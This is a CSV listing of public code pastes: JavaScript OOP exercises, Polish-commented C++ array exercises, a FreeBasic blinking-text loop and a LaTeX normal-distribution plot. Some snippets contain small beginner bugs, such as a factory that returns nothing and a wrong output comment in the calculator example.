id,title,username,language,date,content
3LXG7BEL,Untitled,Mysoft,FreeBasic,Thursday 4th of April 2024 11:42:49 AM CDT,"const Yellow=14,Red=12
var iCor = Yellow
do
  color iCor : iCor xor= (Yellow xor Red)
  locate 1,1 : print ""Price: $3232"";
  sleep 200
loop
  "
HtqgyDDg,calculator,SergioG_0823849,JavaScript,Thursday 4th of April 2024 11:34:07 AM CDT,"class Calculator {
  constructor() {
    this.result = 0;
  }

  add(num) {
    this.result += num;
    return this;
  }

  subtract(num) {
    this.result -= num;
    return this;
  }

  multiply(num) {
    this.result *= num;
    return this;
  }

  divide(num) {
    if (num === 0) {
      throw new Error(""Cannot divide by zero"");
    }
    this.result /= num;
    return this;
  }

  getResult() {
    return this.result;
  }
}

// Test method chaining
const calc = new Calculator();
const result = calc.add(5).multiply(2).subtract(3).divide(2).getResult();
console.log(result); // Output: 4
"
tAsB0Qzu,factory,SergioG_0823849,JavaScript,Thursday 4th of April 2024 11:29:15 AM CDT,"// define facory as a meta-class

class Employee {
  create (type) {
    let employee
    if (type === 'fulltime') {
      employee = new FullTime()
    } else if (type === 'parttime') {
      employee = new PartTime()
    } else if (type === 'temporary') {
      employee = new Temporary()
    } else if (type === 'contractor') {
      employee = new Contractor()
    }
    employee.type = type
    employee.say = function () {
      console.log(`${this.type}: rate ${this.rate}/hour`)
    }
  }
}

// define classes for every job type
class Fulltime {
  constructor () {
    this.rate = '$12'
  }
}

class PartTime {
  constructor () {
    this.rate = '$11'
  }
}

class Temporary {
  constructor () {
    this.rate = '$10'
  }
}

class Contractor {
  constructor () {
    this.rate = '$15'
  }
}

// usage example
// create new factory
const factory = new Employee()
fulltime = factory.create('fulltime')
parttime = factory.create('parttime')
temporary = factory.create('temporary')
contractor = factory.create('contractor')

// use it
fulltime.say()
parttime.say()
temporary.say()
contractor.say()"
3m17VwDa,car inheritance,SergioG_0823849,JavaScript,Thursday 4th of April 2024 11:23:07 AM CDT,"// Constructor function for base Vehicle
function Vehicle(make, model) {
  this.make = make;
  this.model = model;
}

// Method for starting the vehicle
Vehicle.prototype.start = function() {
  console.log(`Starting the ${this.make} ${this.model}`);
};

// Constructor function for Car inheriting from Vehicle
function Car(make, model, numDoors) {
  // Call the parent constructor using call() or apply()
  Vehicle.call(this, make, model);
  this.numDoors = numDoors;
}

// Inherit Vehicle prototype methods
Car.prototype = Object.create(Vehicle.prototype);
Car.prototype.constructor = Car;

// Override start method for Car
Car.prototype.start = function() {
  console.log(`Starting the ${this.make} ${this.model} with ${this.numDoors} doors`);
};

// Test the classes
const myVehicle = new Vehicle('Toyota', 'Camry');
myVehicle.start(); // Output: Starting the Toyota Camry

const myCar = new Car('Honda', 'Civic', 4);
myCar.start(); // Output: Starting the Honda Civic with 4 doors"
bsREf055,dog,SergioG_0823849,JavaScript,Thursday 4th of April 2024 11:21:43 AM CDT,"// 1) Create a class Animal with properties name and a method makeSound()
class Animal {
  constructor(name) {
    this.name = name;
  }

  makeSound() {
    console.log(""The animal makes a sound"");
  }
}

// 2) Create a class Dog that inherits from Animal and overrides the makeSound() method
class Dog extends Animal {
  constructor(name) {
    super(name);
  }

  makeSound() {
    console.log(`${this.name} barks`);
  }
}

// 3) Instantiate a Dog object and call its makeSound() method
const myDog = new Dog(""Buddy"");
myDog.makeSound(); // Output: Buddy barks"
E8K29FWV,Untitled,MeehoweCK,C++,Thursday 4th of April 2024 11:21:27 AM CDT,"#include <iostream>
#include <ctime>
#include <cstdlib>

using namespace std;

int main() {
	const auto W{ 7 };
	const auto K{ 11 };
	int tablica[W][K];		// stworzenie tablicy dwuwymiarowej o wymiarach WxK

	srand(time(nullptr));
	// wypełnienie tablicy:
	auto parzyste{ 0 };
	for (auto i{ 0 }; i < W; ++i) {
		for (auto j{ 0 }; j < K; ++j) {
			tablica[i][j] = 1 + rand() % 30;
			cout << tablica[i][j] << '\t';
			if (tablica[i][j] % 2 == 0) {
				++parzyste;
			}
		}
		cout << endl;
	}
	cout << ""W tablicy znajduje sie "" << parzyste << "" parzystych liczb.\n"";

	return 0;
}"
WqDxDzJ6,Untitled,SergioG_0823849,JavaScript,Thursday 4th of April 2024 11:20:36 AM CDT,"// Define the Engine object
const Engine = {
  horsepower: 250,
  fuelType: 'gasoline'
};

// Define the Vehicle object
const Vehicle = {
  make: 'Jeep',
  model: 'Cherokee'
};

// Create a Car object by composing Vehicle and Engine objects using Object.assign()
const Car = Object.assign({}, Vehicle, Engine);

// Test Car object
console.log(Car);"
3Xq94ktT,Untitled,MeehoweCK,C++,Thursday 4th of April 2024 11:18:59 AM CDT,"#include <iostream>
#include <ctime>
#include <cstdlib>

using namespace std;

int main() {
	const auto W{ 5 };
	const auto K{ 6 };
	int tablica[W][K];		// stworzenie tablicy dwuwymiarowej o wymiarach WxK

	srand(time(nullptr));
	// wypełnienie tablicy:
	for (auto i{ 0 }; i < W; ++i) {
		for (auto j{ 0 }; j < K; ++j) {
			tablica[i][j] = 1 + rand() % 30;
		}
	}

	// wypisanie tablicy na ekran:
	for (auto i{ 0 }; i < W; ++i) {
		for (auto j{ 0 }; j < K; ++j) {
			cout << tablica[i][j] << '\t';
		}
		cout << endl;
	}

	auto parzyste{ 0 };
	// sprawdzenie ile jest liczb parzystych w tablicy:
	for (auto i{ 0 }; i < W; ++i) {
		for (auto j{ 0 }; j < K; ++j) {
			if (tablica[i][j] % 2 == 0) {
				++parzyste;
			}
		}
	}
	cout << ""W tablicy znajduje sie "" << parzyste << "" parzystych liczb.\n"";

	return 0;
}"
4e8TkAEu,Untitled,SergioG_0823849,JavaScript,Thursday 4th of April 2024 11:17:38 AM CDT,"// Prototype object for math operations
const MathOperations = {
  // Method to add two numbers
  add(x, y) {
    return x + y;
  },

  // Method to subtract two numbers
  subtract(x, y) {
    return x - y;
  }
};

// Specific object representing a number value
const NumberValue = {
  value: 0
};

// Delegate math operations to the MathOperations prototype methods
NumberValue.__proto__ = MathOperations;

// Test math operations
const number1 = Object.create(NumberValue);
number1.value = 10;

const number2 = Object.create(NumberValue);
number2.value = 5;

console.log(number1.add(5, 3)); // Output: 8
console.log(number2.subtract(10, 3)); // Output: 7"
eXDtYy3s,Normal Gauss Distribution,nm9505,Latex,Thursday 4th of April 2024 11:11:51 AM CDT,"\documentclass{article}[14pt,a4paper] % Comment the following line to NOT allow the usage of umlauts 
%\usepackage[utf8]{inputenc}
%\useusepackage[utf8]{imputenc} %\usepackage[a4paper, lmargin=2cm, rmargin=2cm, bottom=2cm]{geometry}
\usepackage{color} % Uncomment the following line to allow the usage of graphics (.png, .jpg) 
\usepackage{multicol} \usepackage{verbatim} \usepackage{graphicx} \usepackage{amsmath} \usepackage[all]{xy} \usepackage{pst-all} \usepackage{tikz} \usepackage{gnuplottex}  \usepackage{pst-pdf} 
\usepackage{mathtools,amssymb}
\usepackage{xcolor}
%\usepackage{chronology}
%\usepackage{pst-solides3d} 
\tikzset{flippedeventlabel/.append style={align=center}} \usetikzlibrary{datavisualization} \usetikzlibrary{matrix.skeleton} \usetikzlibrary[shapes,arrows,positioning,fit,backgrounds,intersections,shadows,calc] \usetikzlibrary{positioning} \usetikzlibrary{decorations.text} \usetikzlibrary{decorations.pathmorphing} 
\usepackage{pgfplots} \pgfplotsset{width=10cm,compat=1.9} 
%\psset{viewpoint=10 18 60 rtp2xyz,Decran=10,fontsize=10,unit=0.65cm} 
\usetikzlibrary{patterns} 
\pgfmathdeclarefunction{gauss}{2}{\pgfmathparse{1/(#2*sqrt(2*pi))*exp(-((x-#1)^2)/(2*#2^2))} }
% Start the document
\begin{document} 
\begin{center} 



\begin{tikzpicture}
\begin{pgfonlayer}{background} \path[fill=black,rounded corners]
(-1,-1) rectangle (10,5);
\end{pgfonlayer} 


 
\begin{axis}[white,no markers, domain=0:10, samples=100, axis lines*=left, xlabel=Normal, ylabel=axis $y$, height=5cm, width=10cm, xticklabels={0, $-\infty$, -z, -z/2, 0, z/2, z, $+\infty$, 0}, ytick=\empty, enlargelimits=false, clip=false, axis on top] 
\addplot [very thick, green, domain=-3:3] {gauss(0,1)} \closedcycle;  

\end{axis}
\draw node at (4,1){\large\textcolor{white}{$f(z) = \frac{1}{\sqrt{2\pi}}\ \mathbf{e}^{(\frac{z-\mu}{\sigma})^2}$}};
\end{tikzpicture} 
\end{center} 
%Uncomment the following two lines if you want to have a bibliography1 %\bibliographystyle{alpha} %\bibliography{document} %\begin{thebibliography}{document} %\renewcommand %\refname{BIBLIOGRAFIA} %\bibitem{Baz} \textit{Bazaraa, M.S., J.J. %Jarvis} y \textit{H.D. Sheraly}, %\textit{ProgramaciÃ³n lineal y flujo de redes}, %Segunda EdiciÃ³n. LimusÃ¡, MÃ©xico, DF. 2004. %\end{thebibliography} 
\end{document}
"
e0bbEpCP,Untitled,MeehoweCK,C++,Thursday 4th of April 2024 10:48:27 AM CDT,"#include <iostream>
#include <ctime>
#include <cstdlib>

using namespace std;

int main() {
	const auto W{ 5 };
	const auto K{ 6 };
	int tablica[W][K];		// stworzenie tablicy dwuwymiarowej o wymiarach WxK

	srand(time(nullptr));
	// wypełnienie tablicy:
	for (auto i{ 0 }; i < W; ++i) {
		for (auto j{ 0 }; j < K; ++j) {
			tablica[i][j] = 1 + rand() % 30;
		}
	}

	return 0;
}"
